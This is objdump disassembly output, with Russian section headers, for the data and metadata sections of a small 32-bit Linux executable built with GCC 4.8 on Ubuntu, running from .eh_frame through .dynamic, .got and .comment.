 8048742:	00 00                	add    %al,(%eax)
 8048744:	00 0e                	add    %cl,(%esi)
 8048746:	08 46 0e             	or     %al,0xe(%esi)
 8048749:	0c 4a                	or     $0x4a,%al
 804874b:	0f 0b                	ud2    
 804874d:	74 04                	je     8048753 <_IO_stdin_used+0xe7>
 804874f:	78 00                	js     8048751 <_IO_stdin_used+0xe5>
 8048751:	3f                   	aas    
 8048752:	1a 3b                	sbb    (%ebx),%bh
 8048754:	2a 32                	sub    (%edx),%dh
 8048756:	24 22                	and    $0x22,%al
 8048758:	2c 00                	sub    $0x0,%al
 804875a:	00 00                	add    %al,(%eax)
 804875c:	40                   	inc    %eax
 804875d:	00 00                	add    %al,(%eax)
 804875f:	00 6d fd             	add    %ch,-0x3(%ebp)
 8048762:	ff                   	(bad)  
 8048763:	ff 12                	call   *(%edx)
 8048765:	01 00                	add    %eax,(%eax)
 8048767:	00 00                	add    %al,(%eax)
 8048769:	41                   	inc    %ecx
 804876a:	0e                   	push   %cs
 804876b:	08 85 02 42 0d 05    	or     %al,0x50d4202(%ebp)
 8048771:	49                   	dec    %ecx
 8048772:	87 03                	xchg   %eax,(%ebx)
 8048774:	86 04 83             	xchg   %al,(%ebx,%eax,4)
 8048777:	05 03 02 01 c3       	add    $0xc3010203,%eax
 804877c:	41                   	inc    %ecx
 804877d:	c6 41 c7 41          	movb   $0x41,-0x39(%ecx)
 8048781:	c5 0c 04             	lds    (%esp,%eax,1),%ecx
 8048784:	04 00                	add    $0x0,%al
 8048786:	00 00                	add    %al,(%eax)
 8048788:	38 00                	cmp    %al,(%eax)
 804878a:	00 00                	add    %al,(%eax)
 804878c:	70 00                	jo     804878e <_IO_stdin_used+0x122>
 804878e:	00 00                	add    %al,(%eax)
 8048790:	50                   	push   %eax
 8048791:	fe                   	(bad)  
 8048792:	ff                   	(bad)  
 8048793:	ff 61 00             	jmp    *0x0(%ecx)
 8048796:	00 00                	add    %al,(%eax)
 8048798:	00 41 0e             	add    %al,0xe(%ecx)
 804879b:	08 85 02 41 0e 0c    	or     %al,0xc0e4102(%ebp)
 80487a1:	87 03                	xchg   %eax,(%ebx)
 80487a3:	43                   	inc    %ebx
 80487a4:	0e                   	push   %cs
 80487a5:	10 86 04 41 0e 14    	adc    %al,0x140e4104(%esi)
 80487ab:	83 05 4e 0e 30 02 48 	addl   $0x48,0x2300e4e
 80487b2:	0e                   	push   %cs
 80487b3:	14 41                	adc    $0x41,%al
 80487b5:	c3                   	ret    
 80487b6:	0e                   	push   %cs
 80487b7:	10 41 c6             	adc    %al,-0x3a(%ecx)
 80487ba:	0e                   	push   %cs
 80487bb:	0c 41                	or     $0x41,%al
 80487bd:	c7                   	(bad)  
 80487be:	0e                   	push   %cs
 80487bf:	08 41 c5             	or     %al,-0x3b(%ecx)
 80487c2:	0e                   	push   %cs
 80487c3:	04 10                	add    $0x10,%al
 80487c5:	00 00                	add    %al,(%eax)
 80487c7:	00 ac 00 00 00 84 fe 	add    %ch,-0x17c0000(%eax,%eax,1)
 80487ce:	ff                   	(bad)  
 80487cf:	ff 02                	incl   (%edx)
 80487d1:	00 00                	add    %al,(%eax)
 80487d3:	00 00                	add    %al,(%eax)
 80487d5:	00 00                	add    %al,(%eax)
	...

080487d8 <__FRAME_END__>:
 80487d8:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .init_array:

08049f08 <__frame_dummy_init_array_entry>:
 8049f08:	a0                   	.byte 0xa0
 8049f09:	84 04 08             	test   %al,(%eax,%ecx,1)

Дизассемблирование раздела .fini_array:

08049f0c <__do_global_dtors_aux_fini_array_entry>:
 8049f0c:	80                   	.byte 0x80
 8049f0d:	84 04 08             	test   %al,(%eax,%ecx,1)

Дизассемблирование раздела .jcr:

08049f10 <__JCR_END__>:
 8049f10:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .dynamic:

08049f14 <_DYNAMIC>:
 8049f14:	01 00                	add    %eax,(%eax)
 8049f16:	00 00                	add    %al,(%eax)
 8049f18:	01 00                	add    %eax,(%eax)
 8049f1a:	00 00                	add    %al,(%eax)
 8049f1c:	0c 00                	or     $0x0,%al
 8049f1e:	00 00                	add    %al,(%eax)
 8049f20:	38 83 04 08 0d 00    	cmp    %al,0xd0804(%ebx)
 8049f26:	00 00                	add    %al,(%eax)
 8049f28:	54                   	push   %esp
 8049f29:	86 04 08             	xchg   %al,(%eax,%ecx,1)
 8049f2c:	19 00                	sbb    %eax,(%eax)
 8049f2e:	00 00                	add    %al,(%eax)
 8049f30:	08 9f 04 08 1b 00    	or     %bl,0x1b0804(%edi)
 8049f36:	00 00                	add    %al,(%eax)
 8049f38:	04 00                	add    $0x0,%al
 8049f3a:	00 00                	add    %al,(%eax)
 8049f3c:	1a 00                	sbb    (%eax),%al
 8049f3e:	00 00                	add    %al,(%eax)
 8049f40:	0c 9f                	or     $0x9f,%al
 8049f42:	04 08                	add    $0x8,%al
 8049f44:	1c 00                	sbb    $0x0,%al
 8049f46:	00 00                	add    %al,(%eax)
 8049f48:	04 00                	add    $0x0,%al
 8049f4a:	00 00                	add    %al,(%eax)
 8049f4c:	f5                   	cmc    
 8049f4d:	fe                   	(bad)  
 8049f4e:	ff 6f ac             	ljmp   *-0x54(%edi)
 8049f51:	81 04 08 05 00 00 00 	addl   $0x5,(%eax,%ecx,1)
 8049f58:	4c                   	dec    %esp
 8049f59:	82                   	(bad)  
 8049f5a:	04 08                	add    $0x8,%al
 8049f5c:	06                   	push   %es
 8049f5d:	00 00                	add    %al,(%eax)
 8049f5f:	00 cc                	add    %cl,%ah
 8049f61:	81 04 08 0a 00 00 00 	addl   $0xa,(%eax,%ecx,1)
 8049f68:	73 00                	jae    8049f6a <_DYNAMIC+0x56>
 8049f6a:	00 00                	add    %al,(%eax)
 8049f6c:	0b 00                	or     (%eax),%eax
 8049f6e:	00 00                	add    %al,(%eax)
 8049f70:	10 00                	adc    %al,(%eax)
 8049f72:	00 00                	add    %al,(%eax)
 8049f74:	15 00 00 00 00       	adc    $0x0,%eax
 8049f79:	00 00                	add    %al,(%eax)
 8049f7b:	00 03                	add    %al,(%ebx)
 8049f7d:	00 00                	add    %al,(%eax)
 8049f7f:	00 00                	add    %al,(%eax)
 8049f81:	a0 04 08 02 00       	mov    0x20804,%al
 8049f86:	00 00                	add    %al,(%eax)
 8049f88:	30 00                	xor    %al,(%eax)
 8049f8a:	00 00                	add    %al,(%eax)
 8049f8c:	14 00                	adc    $0x0,%al
 8049f8e:	00 00                	add    %al,(%eax)
 8049f90:	11 00                	adc    %eax,(%eax)
 8049f92:	00 00                	add    %al,(%eax)
 8049f94:	17                   	pop    %ss
 8049f95:	00 00                	add    %al,(%eax)
 8049f97:	00 08                	add    %cl,(%eax)
 8049f99:	83 04 08 11          	addl   $0x11,(%eax,%ecx,1)
 8049f9d:	00 00                	add    %al,(%eax)
 8049f9f:	00 00                	add    %al,(%eax)
 8049fa1:	83 04 08 12          	addl   $0x12,(%eax,%ecx,1)
 8049fa5:	00 00                	add    %al,(%eax)
 8049fa7:	00 08                	add    %cl,(%eax)
 8049fa9:	00 00                	add    %al,(%eax)
 8049fab:	00 13                	add    %dl,(%ebx)
 8049fad:	00 00                	add    %al,(%eax)
 8049faf:	00 08                	add    %cl,(%eax)
 8049fb1:	00 00                	add    %al,(%eax)
 8049fb3:	00 fe                	add    %bh,%dh
 8049fb5:	ff                   	(bad)  
 8049fb6:	ff 6f d0             	ljmp   *-0x30(%edi)
 8049fb9:	82                   	(bad)  
 8049fba:	04 08                	add    $0x8,%al
 8049fbc:	ff                   	(bad)  
 8049fbd:	ff                   	(bad)  
 8049fbe:	ff 6f 01             	ljmp   *0x1(%edi)
 8049fc1:	00 00                	add    %al,(%eax)
 8049fc3:	00 f0                	add    %dh,%al
 8049fc5:	ff                   	(bad)  
 8049fc6:	ff 6f c0             	ljmp   *-0x40(%edi)
 8049fc9:	82                   	(bad)  
 8049fca:	04 08                	add    $0x8,%al
	...

Дизассемблирование раздела .got:

08049ffc <.got>:
 8049ffc:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .got.plt:

0804a000 <_GLOBAL_OFFSET_TABLE_>:
 804a000:	14 9f                	adc    $0x9f,%al
 804a002:	04 08                	add    $0x8,%al
	...
 804a00c:	76 83                	jbe    8049f91 <_DYNAMIC+0x7d>
 804a00e:	04 08                	add    $0x8,%al
 804a010:	86 83 04 08 96 83    	xchg   %al,-0x7c69f7fc(%ebx)
 804a016:	04 08                	add    $0x8,%al
 804a018:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
 804a019:	83 04 08 b6          	addl   $0xffffffb6,(%eax,%ecx,1)
 804a01d:	83 04 08 c6          	addl   $0xffffffc6,(%eax,%ecx,1)
 804a021:	83                   	.byte 0x83
 804a022:	04 08                	add    $0x8,%al

Дизассемблирование раздела .data:

0804a024 <__data_start>:
 804a024:	00 00                	add    %al,(%eax)
	...

0804a028 <__dso_handle>:
 804a028:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .bss:

0804a02c <__bss_start>:
 804a02c:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .comment:

00000000 <.comment>:
   0:	47                   	inc    %edi
   1:	43                   	inc    %ebx
   2:	43                   	inc    %ebx
   3:	3a 20                	cmp    (%eax),%ah
   5:	28 55 62             	sub    %dl,0x62(%ebp)
   8:	75 6e                	jne    78 <_init-0x80482c0>
   a:	74 75                	je     81 <_init-0x80482b7>
   c:	20 34 2e             	and    %dh,(%esi,%ebp,1)
   f:	38 2e                	cmp    %ch,(%esi)
  11:	34 2d                	xor    $0x2d,%al
  13:	32 75 62             	xor    0x62(%ebp),%dh
  16:	75 6e                	jne    86 <_init-0x80482b2>
  18:	74 75                	je     8f <_init-0x80482a9>
  1a:	31 7e 31             	xor    %edi,0x31(%esi)
  1d:	34 2e                	xor    $0x2e,%al
  1f:	30 34 29             	xor    %dh,(%ecx,%ebp,1)
  22:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  25:	38 2e                	cmp    %ch,(%esi)
  27:	34 00                	xor    $0x0,%al
  29:	47                   	inc    %edi
  2a:	43                   	inc    %ebx
  2b:	43                   	inc    %ebx
  2c:	3a 20                	cmp    (%eax),%ah
  2e:	28 55 62             	sub    %dl,0x62(%ebp)
  31:	75 6e                	jne    a1 <_init-0x8048297>
  33:	74 75                	je     aa <_init-0x804828e>
  35:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  38:	38 2e                	cmp    %ch,(%esi)
  3a:	32 2d 31 39 75 62    	xor    0x62753931,%ch
  40:	75 6e                	jne    b0 <_init-0x8048288>
  42:	74 75                	je     b9 <_init-0x804827f>
  44:	31 29                	xor    %ebp,(%ecx)
  46:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  49:	38 2e                	cmp    %ch,(%esi)
  4b:	32 00                	xor    (%eax),%al
